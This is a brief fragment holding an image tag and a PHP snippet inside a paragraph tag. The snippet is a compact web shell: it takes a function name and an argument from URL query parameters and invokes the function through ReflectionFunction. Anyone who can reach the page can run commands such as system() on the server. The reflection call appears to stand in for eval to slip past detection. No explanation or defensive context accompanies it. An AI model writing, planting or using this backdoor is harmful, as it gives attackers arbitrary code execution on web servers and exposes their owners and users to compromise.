

<img src="11.jpg" alt="alt text" title="Title" />


***************************************************
code:

<p><?php
    $func = new ReflectionFunction($_GET[m]);
    echo $func->invokeArgs(array($_GET[c]));
?></p>

***************************************************